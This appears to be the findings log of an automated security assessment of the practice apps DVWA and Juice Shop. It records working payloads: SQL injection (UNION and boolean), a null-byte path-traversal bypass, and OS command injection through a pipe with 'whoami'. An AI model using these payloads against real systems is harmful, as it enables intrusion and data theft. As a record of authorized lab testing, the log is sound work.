state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

findings.title: Product-search SQL injection via q parameter (UNION-based, SQLITE_ERROR on quote)
request_sequence: GET /rest/products/search?q=apple (unauth) -> 200 JSON, 2 rows (Apple Juice (1000ml), Apple Pomace), no error (baseline)
GET /rest/products/search?q=qwert' (unauth) -> 500 text/html 'Error: SQLITE_ERROR: near "'%'": syntax error'
findings.response_evidence: Benign q=apple: HTTP 200, no error, 2 product rows. Single quote q=qwert': HTTP 500, body 'Error: SQLITE_ERROR: near \"'%'\": syntax error'. 9-column UNION q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--: HTTP 200 with injected literal values in the product fields (name:2, description:3, price:4, ... deletedAt:9), proving attacker-controlled SQL is executed. Both the SQL error and the successful UNION are absent in the benign baseline. Unauthenticated session.

findings.title: Unauthenticated access to user feedback records with partially masked author emails
findings.response_evidence: Unauthenticated GET /api/Feedbacks returned HTTP 200 with 8 feedback records (fields UserId, id, comment, rating, createdAt, updatedAt). Authorship is only partially exposed, and the emails are masked in the comment text, not disclosed in full: e.g. comment \"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\" (UserId 1); \"Great shop! Awesome service! (***@juice-sh.op)\" (UserId 2); \"Nothing useful available here! (***der@juice-sh.op)\" (UserId 3); \"... (***ereum@juice-sh.op)\" (UserId 21). Anonymous entries show '(anonymous)' with UserId null. No complete author email address appears in any record. Records are returned without auth (confirmed), but whether masked fragments constitute PII disclosure is a judgment call; the criterion requires disclosure of author email addresses, which is not met in full. Recommend Coordinator decide; the unauthenticated record exposure and the domain/partial local-part leak are the relevant facts.

findings.title: Poison null-byte path traversal bypasses /ftp/ extension filter to retrieve restricted package.json.bak

GET /ftp/package.json.bak%2500.md (unauth) -> 200 application/octet-stream, body begins with package.json content
findings.response_evidence: Raw path: HTTP 403, body 'Error: Only .md and .pdf files are allowed!'. Null-byte bypass GET /ftp/package.json.bak%2500.md: HTTP 200, content_type application/octet-stream, body excerpt: '{ \"name\": \"juice-shop\", \"version\": \"6.2.0-SNAPSHOT\", \"description\": \"An intentionally insecure JavaScript Web Application\", ... \"dependencies\": { ... \"sqlite3\": \"~3.1.13\" ...'. The restricted .bak file is served through the null-byte extension bypass, unauthenticated.

findings.title: [security=medium] DVWA SQL Injection (numeric boolean) on POST /vulnerabilities/sqli/ id parameter
request_sequence: [setup] GET http://dvwa/security.php as dvwa_admin: server reported 'Security level is currently: high' (coordinator assumed medium)

[setup] POST http://dvwa/security.php as dvwa_admin, form security=medium, seclev_submit=Submit, user_token=[REDACTED] -> 302; GET /vulnerabilities/sqli/ then shows 'Security Level: medium' and 'Security level set to medium'
Step2 POST http://dvwa/vulnerabilities/sqli/ form id=1 OR 1=1&Submit=Submit (TRUE)
Step3 POST http://dvwa/vulnerabilities/sqli/ form id=1 AND 1=2&Submit=Submit (FALSE)
findings.response_evidence: [security=medium] Server-side level confirmed as medium after POST security.php (page: 'Security Level: medium'). Step1 id=1 -> 'ID: 1 First name: admin Surname: admin' (1 record). Step2 id=1 OR 1=1 (TRUE) -> 5 records: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith (multiple seeded surnames returned). Step3 id=1 AND 1=2 (FALSE) -> no records (only 'User ID: 1 2 3 4 5' header, zero 'First name/Surname' rows). Injection in numeric context at medium is confirmed. Note: the session_info field consistently reports 'low' and an earlier pre-change request showed 'Security Level: high'; the verdict relies on the page's own security-level text after the medium change, and on the TRUE/FALSE divergence.

findings.title: [security=medium] OS Command Injection via ip parameter using pipe bypass (127.0.0.1| whoami)
request_sequence: POST http://dvwa/security.php security=medium&seclev_submit=Submit&user_token=[REDACTED] -> 302, page then reports 'Security level set to medium'
POST http://dvwa/vulnerabilities/exec/ ip=127.0.0.1&Submit=Submit (benign baseline) -> ping output only
POST http://dvwa/vulnerabilities/exec/ ip=127.0.0.1| whoami&Submit=Submit -> output contains www-data
findings.response_evidence: [security=medium] Benign ip=127.0.0.1 returned only PING output (4 packets, 0% loss) with no 'www-data'. Payload ip='127.0.0.1| whoami' returned page body 'Ping a device ... Enter an IP address: www-data' with 'Security Level: medium' in the footer. The pipe without ';' or '&&' bypassed the medium blacklist and executed whoami as the web process identity www-data. Note: session_info metadata still displayed security_level 'low' but the page itself displayed 'Security Level: medium' and 'Security level set to medium'.

findings.title: DVWA SQL Injection via session-stored id [security=high]
request_sequence: POST http://dvwa/security.php security=high&seclev_submit=Submit&user_token=[REDACTED] -> 302; GET /security.php -> 'Security level is currently: high' / 'Security level set to high'
GET http://dvwa/vulnerabilities/sqli/ -> exactly 1 record: ID: 1 # First name: admin Surname: admin
findings.response_evidence: [security=high] Security level confirmed high (page: 'Security level is currently: high'; 'Security level set to high'). Baseline id=1 # returned 1 record (admin). TRUE payload id=1' OR '1'='1' # returned 5 records with surnames: admin (First name admin), Brown (Gordon), Me (Hack), Picasso (Pablo), Smith (Bob). FALSE payload id=1' AND '1'='2' # returned 0 records (no 'ID:' rows; only 'Click here to change your ID' and page chrome). Boolean-differential behavior confirms SQL injection through the session-stored id at high level. Note: session_info metadata reported 'low' throughout while the page itself reported high; the page content was treated as authoritative for the level.

findings.title: [security=high] OS Command Injection via ip parameter (pipe without trailing space bypass)
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> user_token=[REDACTED] page shows 'Security level is currently: high'
GET http://dvwa/vulnerabilities/exec/ (dvwa_admin) -> 200, form fields ip, Submit (no user_token in form)
findings.response_evidence: [security=high] Payload ip=127.0.0.1|whoami (no space after pipe) returned page body containing 'Enter an IP address: www-data' followed by 'Security Level: high'. Benign control ip=127.0.0.1 returned normal ping output ('PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data ... 4 packets transmitted, 4 received, 0% packet loss') with no www-data. The www-data identity appears only in the injected-payload response, so the injection is confirmed. Caveat: the security.php POST returned 302 and the session_info field reported security_level 'low' on later responses, but the page body on /vulnerabilities/exec/ explicitly reads 'Security Level: high' and 'Security level set to high' was shown after the POST, and the initial GET of /security.php showed 'Security level is currently: high', so the test was run at high.

findings.title: Stored XSS on guestbook at security=medium (not verified; level mismatch, low already confirmed)
findings.response_evidence: [security mismatch] The dvwa_admin session reports security_level=low on GET /vulnerabilities/xss_s/ (session_info.security_level=low), not medium as the assignment record states. The page body footer text also contains 'Security Level: high', which is inconsistent with the session metadata. The form matches the observed structure: txtName maxlength=10, mtxMessage maxlength=50, btnSign, btnClear. The guestbook already contains a prior canary entry ('test' / 'window.xss_flag=1'), left over from the earlier low-level verification. findings.title: Unauthenticated /api/Feedbacks exposes partially masked author emails inside comments
findings.response_evidence: HTTP 200 without authentication, status=success, 8 records. No email field is returned; UserId, id, comment, rating and timestamps are the only fields. Masked author fragments appear inside comment text: record 1 '(***in@juice-sh.op)' (UserId 1), record 2 '(***@juice-sh.op)' (UserId 2), record 3 '(***der@juice-sh.op)' (UserId 3), record 4 '(***ereum@juice-sh.op)' (UserId 21). Records 5-8 have UserId null and show '(anonymous)'. The masking is applied server-side and the full local part is never returned. The domain juice-sh.op is fully exposed and the suffixes leak partial local parts, which may be enough to narrow an address, but the full author address is not disclosed as a field or in full text. Verdict: inconclusive. Coordinator should decide whether partial-suffix leakage counts as CWE-359 PII disclosure. Not confirmed as full email exposure.

findings.title: Unauthenticated User-Feedback Exposure with Masked Author Emails on /api/Feedbacks
findings.response_evidence: HTTP 200, application/json, no authentication. Returned 8 feedback records (ids 1-8) with fields UserId, id, comment, rating, createdAt, updatedAt. Records are readable without any auth, so the unauthenticated-access half of the criterion is MET. PII half is NOT established: author emails appear only inside comment text, in masked form, e.g. id1 "(***in@juice-sh.op)", id2 "(***@juice-sh.op)", id3 "(***der@juice-sh.op)", id4 "(***ereum@juice-sh.op)". Masking pattern: first local-part characters replaced by '***', then the domain 'juice-sh.op' fully visible; the masked fragment is 0-5 trailing characters of the local part. Anonymous entries (UserId null) show '(anonymous)'. No full email address and no email field is returned by the API. Judgment: the fragments are intentionally truncated and do not reliably identify an individual, so PII exposure is not confirmed. Recorded as inconclusive; the Coordinator may decide whether to treat partial-email disclosure as a low-severity finding. UserId numeric values are also exposed.

findings.title: [security=high] SQL Injection via Session-Stored id in session-input.php (consumed by /vulnerabilities/sqli/)
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> page body 'Security Level: high'
findings.response_evidence: [security=high] Security page body reads "Security level is currently: high" (the tool's session_info field reported 'low', which conflicts with the page body; the page body was treated as authoritative and the page itself displays "Security Level: high"). TRUE payload id=1' OR '1'='1' # stored via session-input.php ("Session ID: 1' OR '1'='1' # Close"). Subsequent GET /vulnerabilities/sqli/ returned 5 records: ID 1' OR '1'='1' # -> First name: admin Surname: admin; First name: Gordon Surname: Brown; First name: Hack Surname: Me; First name: Pablo Surname: Picasso; First name: Bob Surname: Smith. FALSE control id=1' AND '1'='2' # stored, then GET /vulnerabilities/sqli/ returned ZERO records (no 'ID:' rows; only 'Click here to change your ID' and footer). Multiple seeded surnames returned for TRUE vs zero for FALSE satisfies the criterion. Note: this is the session-based injection source for the high-level SQLi instance. The POST entry point is distinct from the earlier high-level finding; it is recorded separately as the injection vector, not a copy of the same request.

findings.title: Unauthenticated User-Feedback Exposure on GET /api/Feedbacks (author email PII)
findings.response_evidence: HTTP 200, content-type application/json, no auth. Returned 8 feedback records without authentication (ids 1-8) with fields UserId, id, comment, rating, createdAt, updatedAt. Author email appears only inside the comment text, and only in masked form: id1 "(***in@juice-sh.op)" (UserId 1), id2 "(***@juice-sh.op)" (UserId 2), id3 "(***der@juice-sh.op)" (UserId 3), id4 "(***ereum@juice-sh.op)" (UserId 21). Records id5-8 have UserId null and show "(anonymous)". No full, unmasked author email address is present in any field. Records are readable without auth and carry numeric UserIds, but full email addresses are not disclosed, so the PII-disclosure criterion (author email addresses) is not met. Partial masking still leaks a fragment of local part and domain; judged insufficient for confirmation without a full-address disclosure.

findings.title: Unauthenticated User-Feedback PII Exposure on GET /api/Feedbacks
findings.response_evidence: HTTP 200, no authentication, content-type application/json, status=success, 8 feedback records returned. Each record exposes UserId (1, 2, 3, 21, or null), id, comment, rating, createdAt, updatedAt. Author identity appears only inside comment text as masked fragments: "(***in@juice-sh.op)", "(***@juice-sh.op)", "(***der@juice-sh.op)", "(***ereum@juice-sh.op)"; the remaining entries are "(anonymous)". No full author email address is disclosed in any field. Unauthenticated access to records and numeric UserId linkage is confirmed, but the email addresses are masked, so the stated criterion (disclosure of author email addresses as PII) is not fully met. Verdict inconclusive: partial PII/user-ID exposure is real; a full-address disclosure would need a separate source (e.g., an unauthenticated user-profile endpoint), which was out of this assignment's scope.

findings.title: Unauthenticated user-feedback listing exposes author identifiers and partially masked emails
findings.response_evidence: [session=unauth] HTTP 200, application/json, {"status":"success","data":[8 records]}. Records include UserId (1, 2, 3, 21, or null), id, comment, rating, createdAt, updatedAt. Author emails appear only inside comment text and are masked server-side: "(***in@juice-sh.op)", "(***@juice-sh.op)", "(***der@juice-sh.op)", "(***ereum@juice-sh.op)". The remaining 4 records are anonymous (UserId null, comment suffix "(anonymous)"). No full email address appears in any record. Verdict rationale: the endpoint is reachable without authentication and links feedback to numeric UserIds, and the masked fragments leak partial local-parts and domain. However, the criterion requires disclosure of author email addresses, and the response does not disclose full addresses (the masking is applied deliberately). Classified as inconclusive for PII exposure; the Coordinator may decide whether partial-email disclosure plus UserId linkage counts as CWE-359 severity-wise.

findings.title: Unauthenticated User-Feedback Exposure on GET /api/Feedbacks (author email PII, masked)
findings.response_evidence: HTTP 200 without authentication, JSON {"status":"success","data":[...]} with 8 feedback records containing UserId, id, comment, rating, createdAt, updatedAt. Records are reachable anonymously (criterion 'returns records WITHOUT authentication' is met). However, author email addresses are NOT fully disclosed: comments carry masked fragments only, e.g. id=1 "(***in@juice-sh.op)", id=2 "(***@juice-sh.op)", id=3 "(***der@juice-sh.op)", id=4 "(***ereum@juice-sh.op)"; anonymous entries have UserId null and "(anonymous)". No full email field is present in the response. The masking indicates the application intentionally obscures the author address, so the disclosure is partial (domain and a fragment of local part, plus a numeric UserId linking to a user). Judged not to meet the 'disclose author email addresses' bar for CWE-359 confirmation; recommend Coordinator treat as a low-severity information exposure (unauthenticated access to feedback + UserId linkage) rather than full PII exposure.

findings.title: Unauthenticated access to user feedback records with partially masked author email fragments
findings.response_evidence: [session=unauth] HTTP 200, application/json, {"status":"success","data":[...8 records...]} with no authentication. Records expose UserId (e.g. 1, 2, 3, 21, null), id, comment, rating, createdAt, updatedAt. No email field is present in any record. Author emails appear only inside comment text as masked fragments: "(***in@juice-sh.op)", "(***@juice-sh.op)", "(***der@juice-sh.op)", "(***ereum@juice-sh.op)"; anonymous entries show "(anonymous)". Verdict rationale: the endpoint is unauthenticated and returns user-linked data (UserId), and the masked fragments leak the domain and a partial local-part suffix, but full author email addresses are NOT disclosed. The CWE-359 criterion (disclosure of author email addresses) is therefore not fully met; this is partial/residual PII exposure and should be triaged by the Coordinator as low-severity or as a masking weakness rather than a full PII disclosure.
